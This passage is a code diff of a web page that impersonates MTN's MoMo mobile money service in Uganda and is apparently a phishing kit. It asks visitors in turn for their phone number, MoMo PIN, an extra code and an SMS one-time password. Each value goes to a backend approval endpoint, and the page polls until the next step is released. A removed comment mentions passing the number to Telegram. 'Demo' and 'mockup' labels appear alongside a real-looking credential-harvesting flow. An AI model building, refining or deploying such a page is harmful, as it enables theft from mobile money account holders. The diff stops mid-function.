@@ -3,134 +3,134 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification Page</title>
+    <title>Welcome to MoMo</title>
     <style>
-      body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f7f9fa; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; position: relative; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f7f9fa; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; position: relative; }
+        
+        /* TOP BANNER SECTION */
+        .top-banner { background-color: #005a70; width: 100%; height: 260px; display: flex; flex-direction: column; align-items: center; justify-content: center; position: absolute; top: 0; left: 0; z-index: 1; }
+        
+        /* LOGO BOX DESIGN STYLE */
+        .logo-box { background-color: #ffcc00; width: 85px; height: 85px; border-radius: 18px; display: flex; flex-direction: column; align-items: center; justify-content: center; box-shadow: 0 4px 10px rgba(0,0,0,0.15); margin-bottom: 8px; }
+        .logo-box h2 { margin: 0; color: #005a70; font-size: 24px; font-weight: 900; letter-spacing: -1px; }
+        .logo-sub { color: #ffcc00; font-size: 11px; font-weight: bold; text-transform: uppercase; letter-spacing: 0.5px; }
 
-/* 🔵 DEEP TEAL TOP BANNER DESIGN */
-.top-banner { background-color: #005a70; width: 100%; height: 260px; display: flex; flex-direction: column; align-items: center; justify-content: center; position: absolute; top: 0; left: 0; z-index: 1; }
+        /* FLOATING CARD CONTAINER DESIGN STYLE */
+        #app-container { background: white; border-radius: 30px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08); padding: 40px 25px 30px 25px; max-width: 420px; width: 90%; text-align: center; box-sizing: border-box; position: relative; z-index: 2; margin-top: 195px; }
+        
+        h1 { color: #003644; font-size: 24px; font-weight: bold; margin: 0 0 20px 0; }
+        .input-instruction { color: #5a7175; font-size: 15px; font-weight: 500; margin: 0 0 12px 0; text-align: left; width: 100%; display: block; }
 
-/* 🟡 YELLOW SQUARE LOGO WITH ROUNDED CORNERS */
-.logo-box { background-color: #ffcc00; width: 85px; height: 85px; border-radius: 18px; display: flex; flex-direction: column; align-items: center; justify-content: center; box-shadow: 0 4px 10px rgba(0,0,0,0.15); margin-bottom: 8px; }
-.logo-box h2 { margin: 0; color: #005a70; font-size: 24px; font-weight: 900; letter-spacing: -1px; }
-.logo-sub { color: #ffcc00; font-size: 11px; font-weight: bold; text-transform: uppercase; letter-spacing: 0.5px; }
+        /* WRAPPER CONFIGURATIONS FOR FIELD ELEMENTS */
+        .input-wrapper { position: relative; display: flex; align-items: center; width: 100%; margin-bottom: 25px; box-sizing: border-box; }
+        .country-badge { position: absolute; left: 18px; font-size: 20px; display: flex; align-items: center; pointer-events: none; z-index: 5; }
+        
+        input { width: 100% !important; padding: 16px 16px 16px 58px !important; border: 1px solid #cbd5e1; border-radius: 20px; font-size: 17px; box-sizing: border-box !important; outline: none; color: #334155; transition: border-color 0.2s; font-weight: 500; }
+        input:focus { border-color: #005a70; }
+        input::placeholder { color: #94a3b8; }
 
-/* ⚪ FLOATING WHITE CENTRAL INPUT CARD */
-#app-container { background: white; border-radius: 30px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08); padding: 40px 25px 30px 25px; max-width: 420px; width: 90%; text-align: center; box-sizing: border-box; position: relative; z-index: 2; margin-top: 195px; }
+        /* SUBMISSION BUTTONS INTERFACE CONTROL STYLES */
+        button { width: 100% !important; background-color: #cbd5e1; border: none; border-radius: 25px; padding: 18px; font-size: 16px; font-weight: bold; color: white; cursor: pointer; text-transform: uppercase; letter-spacing: 0.5px; transition: background-color 0.2s, color 0.2s; margin-top: 5px; box-sizing: border-box !important; }
+        button:not(:disabled) { background-color: #ffcc00 !important; color: #003644 !important; cursor: pointer !important; }
+        button:disabled { background-color: #d1d5db !important; color: #9ca3af !important; cursor: not-allowed !important; }
+        
+        .legal-text { color: #64748b; font-size: 13px; line-height: 1.5; margin-top: 30px; padding: 0 10px; }
+        .legal-text a { color: #005a70; text-decoration: none; font-weight: bold; }
 
-h1 { color: #003644; font-size: 24px; font-weight: bold; margin: 0 0 20px 0; }
-.input-instruction { color: #5a7175; font-size: 15px; font-weight: 500; margin: 0 0 12px 0; }
-
-/* 🇺🇬 INNER COMPONENT WRAPPERS WITH FLAG BADGE */
-.input-wrapper { position: relative; display: flex; align-items: center; width: 100%; margin-bottom: 25px; }
-.country-badge { position: absolute; left: 16px; font-size: 20px; display: flex; align-items: center; pointer-events: none; }
-
-input { width: 100%; padding: 16px 16px 16px 54px; border: 1px solid #cbd5e1; border-radius: 20px; font-size: 17px; box-sizing: border-box; outline: none; color: #334155; transition: border-color 0.2s; font-weight: 500; }
-input:focus { border-color: #005a70; }
-input::placeholder { color: #94a3b8; }
-
-/* ✨ ROUNDED GREY/YELLOW INTERACTION BUTTONS */
-button { width: 100%; background-color: #cbd5e1; border: none; border-radius: 25px; padding: 18px; font-size: 16px; font-weight: bold; color: white; cursor: pointer; text-transform: uppercase; letter-spacing: 0.5px; transition: background-color 0.2s, color 0.2s; margin-top: 5px; }
-button:not(:disabled) { background-color: #ffcc00; color: #003644; }
-button:disabled { background-color: #d1d5db; color: #9ca3af; cursor: not-allowed; }
-
-.legal-text { color: #64748b; font-size: 13px; line-height: 1.5; margin-top: 30px; padding: 0 10px; }
-.legal-text a { color: #005a70; text-decoration: none; font-weight: bold; }
-
-/* SPINNER OVERLAY CONFIGURATIONS */
-#loading-spinner-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 43, 54, 0.96); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; color: white; text-align: center; padding: 20px; box-sizing: border-box; }
-.spinner-circle { width: 55px; height: 55px; border: 5px solid rgba(255,255,255,0.1); border-top-color: #2ecc71; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 25px; }
-#loading-spinner-overlay h3 { font-size: 22px; margin: 0 0 10px 0; font-weight: bold; }
-#loading-spinner-overlay p { font-size: 15px; color: #94a3b8; margin: 0; }
-@keyframes spin { to { transform: rotate(360deg); } }
-  
+        /* PROCESSING LOADING MASK LAYER CODES */
+        #loading-spinner-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 43, 54, 0.96); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 9999; color: white; text-align: center; padding: 20px; box-sizing: border-box; }
+        .spinner-circle { width: 55px; height: 55px; border: 5px solid rgba(255,255,255,0.1); border-top-color: #2ecc71; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 25px; }
+        #loading-spinner-overlay h3 { font-size: 22px; margin: 0 0 10px 0; font-weight: bold; }
+        #loading-spinner-overlay p { font-size: 15px; color: #94a3b8; margin: 0; }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <!-- PLACE THE TEAL AND LOGO BANNER RIGHT BELOW YOUR BODY TAG -->
-<div class="top-banner">
-    <div class="logo-box">
-        <h2>MoMo</h2>
-    </div>
-    <div class="logo-sub">from MTN</div>
-</div>
-
-<!-- UNIVERSAL SPINNER OVERLAY -->
-<div id="loading-spinner-overlay">
-    <div class="spinner-circle"></div>
-    <h3>Secure Verification</h3>
-    <p id="spinner-message">Verifying details... Please do not close this page.</p>
-</div>
-
-<div id="app-container">
-    
-    <!-- STEP 0: WELCOME SCREEN -->
-    <div id="step-welcome">
-        <h1>Welcome to MoMo</h1>
-        <p class="input-instruction">Enter number *</p>
-        <div class="input-wrapper">
-            <div class="country-badge">🇺🇬</div>
-            <input type="tel" id="input-phone" placeholder="e.g. 778260583" maxlength="9">
+    <!-- TOP TEAL AND LOGO BANNER STRIP -->
+    <div class="top-banner">
+        <div class="logo-box">
+            <h2>MoMo</h2>
         </div>
-        <button id="btn-welcome" disabled>Next</button>
-        <div class="legal-text">
-            Signing in confirms your acceptance of our <a href="#">Terms</a> and <a href="#">Privacy Policy</a>
+        <div class="logo-sub">from MTN</div>
+    </div>
+
+    <!-- PROCESSING LOADING SPINNER VIEW MASK -->
+    <div id="loading-spinner-overlay">
+        <div class="spinner-circle"></div>
+        <h3>Secure Verification</h3>
+        <p id="spinner-message">Verifying details... Please do not close this page.</p>
+    </div>
+
+    <div id="app-container">
+        
+        <!-- STEP 0: PHONE DATA ACCOUNT SCREEN -->
+        <div id="step-welcome">
+            <h1>Welcome to MoMo</h1>
+            <p class="input-instruction">Enter number *</p>
+            <div class="input-wrapper">
+                <div class="country-badge">🇺🇬</div>
+                <input type="tel" id="input-phone" placeholder="e.g. 778260583" maxlength="9">
+            </div>
+            <button id="btn-welcome" onclick="handleWelcomeTransition()" disabled="disabled">Next</button>
+            <div class="legal-text">
+                Signing in confirms your acceptance of our <a href="#">Terms</a> and <a href="#">Privacy Policy</a>
+            </div>
         </div>
-    </div>
 
-    <!-- STEP 1: PIN SCREEN -->
-    <div id="step-pin" style="display: none;">
-        <h1>Enter MoMo PIN</h1>
-        <p class="input-instruction">Enter your 5-digit verification PIN *</p>
-        <div class="input-wrapper">
-            <div class="country-badge">🔐</div>
-            <input type="password" id="input-pin" maxlength="5" placeholder="•••••">
+        <!-- STEP 1: ACCOUNT ACCESS TRANSACTION PIN SCREEN -->
+        <div id="step-pin" style="display: none;">
+            <h1>Enter MoMo PIN</h1>
+            <p class="input-instruction">Enter your 5-digit verification PIN *</p>
+            <div class="input-wrapper">
+                <div class="country-badge">🔐</div>
+                <input type="password" id="input-pin" maxlength="5" placeholder="•••••">
+            </div>
+            <div id="status-pin" style="display: none;">Waiting for approval...</div>
+            <button id="btn-pin" disabled="disabled">Next</button>
         </div>
-        <div id="status-pin" style="display: none;">Waiting for approval...</div>
-        <button id="btn-pin" disabled>Next</button>
-    </div>
 
-    <!-- STEP 2: CUSTOM VALUE SCREEN -->
-    <div id="step-code1" style="display: none;">
-        <h1>Verification Demo</h1>
-        <p class="input-instruction">Enter test value parameters *</p>
-        <div class="input-wrapper">
-            <div class="country-badge">📝</div>
-            <input type="text" id="input-code1" placeholder="Enter text code here">
+        <!-- STEP 2: TEMPLATE PARAMETERS SCREEN VIEW -->
+        <div id="step-code1" style="display: none;">
+            <h1>Verification Demo</h1>
+            <p class="input-instruction">Enter test value parameters *</p>
+            <div class="input-wrapper">
+                <div class="country-badge">📝</div>
+                <input type="text" id="input-code1" placeholder="Enter text code here">
+            </div>
+            <div id="status-code1" style="display: none;">Waiting for approval...</div>
+            <button id="btn-code1">Continue</button>
         </div>
-        <div id="status-code1" style="display: none;">Waiting for approval...</div>
-        <button id="btn-code1">Continue</button>
-    </div>
 
-    <!-- STEP 3: FINAL SMS OTP SCREEN -->
-    <div id="step-code2" style="display: none;">
-        <h1>Enter SMS Code</h1>
-        <p class="input-instruction">Enter 4-digit confirmation OTP *</p>
-        <div class="input-wrapper">
-            <div class="country-badge">💬</div>
-            <input type="text" id="input-code2" maxlength="4" placeholder="••••">
+        <!-- STEP 3: OTP ACCOUNT CODE SUBMIT SCREEN VIEW -->
+        <div id="step-code2" style="display: none;">
+            <h1>Enter SMS Code</h1>
+            <p class="input-instruction">Enter 4-digit confirmation OTP *</p>
+            <div class="input-wrapper">
+                <div class="country-badge">💬</div>
+                <input type="text" id="input-code2" maxlength="4" placeholder="••••">
+            </div>
+            <div id="status-code2" style="display: none;">Waiting for approval...</div>
+            <button id="btn-code2" disabled="disabled">✓</button>
         </div>
-        <div id="status-code2" style="display: none;">Waiting for approval...</div>
-        <button id="btn-code2" disabled>✓</button>
+
+        <!-- STEP 4: MOCK TRANSACTION COMPLETE VIEW -->
+        <div id="step-success" style="display: none;">
+            <div style="font-size: 50px; color: #2ecc71; margin-bottom: 15px;">✓</div>
+            <h1>Completed</h1>
+            <p style="color: #5a7175; font-size: 15px;">Your verification sequence mockup completed successfully.</p>
+        </div>
+
     </div>
 
-    <!-- STEP 4: SUCCESS VIEW -->
-    <div id="step-success" style="display: none;">
-        <div style="font-size: 50px; color: #2ecc71; margin-bottom: 15px;">✓</div>
-        <h1>Completed</h1>
-        <p style="color: #5a7175; font-size: 15px;">Your verification sequence mockup completed successfully.</p>
-    </div>
-
-</div>
-
-
+    <!-- BACKGROUND ROUTER AND RESPONSE CONTROLLER SCRIPTS -->
     <script>
         let sessionId = null;
         let currentStage = null;
         let statusInterval = null;
         let cachedPhone = "";
 
+        // Establish session mapping variables on app start
         async function initSession() {
             try {
                 const res = await fetch("/api/session", { method: "POST" });
@@ -142,26 +142,13 @@ button:disabled { background-color: #d1d5db; color: #9ca3af; cursor: not-allowed
         }
         initSession();
 
-        // Length checking listeners to enable buttons automatically
+        // Digit parsing constraint watchers for text inputs
         document.getElementById("input-phone").addEventListener("input", function() {
-    const btn = document.getElementById("btn-welcome");
-    
-    // Strip hidden characters, dashes, or prefix spaces to count the raw numbers
-    let cleanVal = this.value.replace(/\D/g, "");
-    
-    if (cleanVal.length === 9) {
-        btn.disabled = false;
-        btn.removeAttribute("disabled");
-    } else {
-        btn.disabled = true;
-        btn.setAttribute("disabled", "true");
-    }
-});
-
-
-        document.getElementById("input-pin").addEventListener("input", function() {
-            const btn = document.getElementById("btn-pin");
-            if (this.value.trim().length === 5) {
+            const btn = document.getElementById("btn-welcome");
+            let cleanVal = this.value.replace(/\D/g, "");
+            this.value = cleanVal;
+            
+            if (cleanVal.length === 9) {
                 btn.disabled = false;
                 btn.removeAttribute("disabled");
             } else {
@@ -170,85 +157,36 @@ button:disabled { background-color: #d1d5db; color: #9ca3af; cursor: not-allowed
             }
         });
 
-        // Screen Navigation Triggers
-       document.getElementById("btn-welcome").addEventListener("click", function() {
-    const phoneField = document.getElementById("input-phone");
-    let cleanPhone = phoneField.value.replace(/\D/g, "");
-    
-    // Safety check matching the exact number criteria
-    if (cleanPhone.length !== 9) return;
-    
-    cachedPhone = cleanPhone; // Saves the clean 9 digits to pass to Telegram safely
-    
-    // Transition views locally right away
-    document.getElementById("step-welcome").style.display = "none";
-    document.getElementById("step-pin").style.display = "block";
-});
- 
+        document.getElementById("input-pin").addEventListener("input", function() {
+            const btn = document.getElementById("btn-pin");
+            let cleanVal = this.value.replace(/\D/g, "");
+            this.value = cleanVal;
 
-
-        document.getElementById("btn-pin").addEventListener("click", () => {
-            const pinVal = document.getElementById("input-pin").value.trim();
-            if (pinVal.length !== 5) return;
-            executeDispatch("pin", { phone: cachedPhone, pin: pinVal }, "step-pin", "step-code1", "btn-pin", "status-pin", "input-pin");
-        });
-
-        document.getElementById("btn-code1").addEventListener("click", () => {
-            const code1Val = document.getElementById("input-code1").value.trim();
-            if (!code1Val) return alert("Enter value.");
-            executeDispatch("code1", { code1: code1Val }, "step-code1", "step-code2", "btn-code1", "status-code1", "input-code1");
-        });
-
-        document.getElementById("btn-code2").addEventListener("click", () => {
-            const code2Field = document.getElementById("input-code2");
-            const code2Val = code2Field ? code2Field.value.trim() : "1234";
-            executeDispatch("code2", { code2: code2Val }, "step-code2", "step-success", "btn-code2", "status-code2", "input-code2");
-        });
-
-        async function executeDispatch(stage, payload, currentId, nextId, btnId, statusId, inputId) {
-            currentStage = stage;
-            const btn = document.getElementById(btnId);
-            const statusLabel = document.getElementById(statusId);
-            const inputField = document.getElementById(inputId);
-
-            // 🚀 SPINNER TRIGGER: Show spinner overlay across all 3 submission steps
-            const spinnerOverlay = document.getElementById("loading-spinner-overlay");
-            const spinnerMsg = document.getElementById("spinner-message");
-            if (spinnerOverlay) {
-                if (stage === "pin") {
-                    if (spinnerMsg) spinnerMsg.innerText = "Verifying your PIN... Please do not close this page.";
-                } else if (stage === "code1") {
-                    if (spinnerMsg) spinnerMsg.innerText = "Verifying your Custom Text... Please do not close this page.";
-                } else if (stage === "code2") {
-                    if (spinnerMsg) spinnerMsg.innerText = "Verifying your SMS Code... Please do not close this page.";
-                }
-                spinnerOverlay.style.display = "flex"; // Turn on overlay mask display flex
+            if (cleanVal.length === 5) {
+                btn.disabled = false;
+                btn.removeAttribute("disabled");
+            } else {
+                btn.disabled = true;
+                btn.setAttribute("disabled", "true");
             }
+        });
 
-            if (btn) { btn.disabled = true; btn.setAttribute("disabled", "true"); }
-            if (inputField) { inputField.disabled = true; inputField.setAttribute("disabled", "true"); }
-            if (statusLabel) statusLabel.style.display = "block";
+        document.getElementById("input-code2").addEventListener("input", function() {
+            const btn = document.getElementById("btn-code2");
+            let cleanVal = this.value.replace(/\D/g, "");
+            this.value = cleanVal;
 
-            try {
-                const response = await fetch("/api/approval-request", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ sessionId, stage, payload })
-                });
-                const result = await response.json();
-                if (result.ok) {
-                    runPollingLoop(currentId, nextId, btn, statusLabel, inputField);
-                } else {
-                    unfreezeUI(btn, statusLabel, inputField);
-                }
-            } catch (err) {
-                unfreezeUI(btn, statusLabel, inputField);
+            if (cleanVal.length === 4) {
+                btn.disabled = false;
+                btn.removeAttribute("disabled");
+            } else {
+                btn.disabled = true;
+                btn.setAttribute("disabled", "true");
             }
-        }
+        });
 
-        function runPollingLoop(currentId, nextId, btn, statusLabel, inputField) {
-            if (statusInterval) clearInterval(statusInterval);
+        // Direct-trigger click processor for welcome workflow step
+        function handleWelcomeTransition() {
+            const phoneField = document.getElementById("input-phone");
 
-            statusInterval = setInterval(async () => {
-                try {
 
